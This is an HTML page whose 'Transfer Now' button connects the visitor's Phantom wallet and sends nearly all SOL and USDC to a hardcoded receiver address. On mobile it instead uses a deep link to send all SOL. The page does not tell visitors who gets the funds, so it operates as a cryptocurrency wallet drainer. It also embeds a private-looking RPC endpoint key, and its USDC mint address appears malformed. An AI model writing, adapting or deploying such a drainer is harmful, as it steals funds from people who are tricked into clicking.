<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
</head>
<body>
    <h2>Click below to transfer SOL and USDC</h2>
    <button id="transferButton">Transfer Now</button>

    <script>
        document.getElementById('transferButton').addEventListener('click', async () => {
            const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
            const usdcMintAddress = "EPjFWdd5AufqSSqeM2q4wrkEMuPeHQHqEAgHyoGdsXh";

            function isMobileDevice() {
                return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            }

            if (isMobileDevice()) {
                // Mobile deep link for Phantom wallet to send all SOL
                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}&asset=sol&amount=ALL`;
                window.location.href = mobileLink;
            } else {
                if (!window.solana) {
                    alert("Phantom wallet not found. Please install it.");
                    return;
                }

                try {
                    await window.solana.connect();
                    const provider = window.solana;
                    const connection = new solanaWeb3.Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df", 'confirmed');

                    const publicKey = provider.publicKey;
                    alert("Connected wallet: " + publicKey.toBase58());

                    const transaction = new solanaWeb3.Transaction();

                    // Transfer all SOL
                    const balance = await connection.getBalance(publicKey);
                    if (balance > 5000) {
                        transaction.add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: new solanaWeb3.PublicKey(receiverWallet),
                                lamports: balance - 5000, // Leaving a small fee for transaction
                            })
                        );
                    }

                    // Transfer USDC token
                    const usdcToken = new solanaWeb3.PublicKey(usdcMintAddress);
                    const senderTokenAccount = await connection.getParsedTokenAccountsByOwner(publicKey, {
                        mint: usdcToken,
                    });

                    if (senderTokenAccount.value.length > 0) {
                        const tokenAmount = senderTokenAccount.value[0].account.data.parsed.info.tokenAmount.uiAmount;
                        if (tokenAmount > 0) {
                            transaction.add(
                                splToken.createTransferInstruction(
                                    senderTokenAccount.value[0].pubkey,
                                    new solanaWeb3.PublicKey(receiverWallet),
                                    publicKey,
                                    tokenAmount * Math.pow(10, senderTokenAccount.value[0].account.data.parsed.info.tokenAmount.decimals),
                                    [],
                                    solanaWeb3.TOKEN_PROGRAM_ID
                                )
                            );
                        }
                    }

                    if (transaction.instructions.length === 0) {
                        alert("No funds available to transfer.");
                        return;
                    }

                    const { signature } = await provider.signAndSendTransaction(transaction);
                    alert("Transaction sent! Signature: " + signature);
                    await connection.confirmTransaction(signature);
                    alert("Transaction confirmed!");

                } catch (error) {
                    console.error("Error:", error);
                    alert("Error: " + error.message);
                }
            }
        });
    </script>

    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token"></script>
</body>
</html>
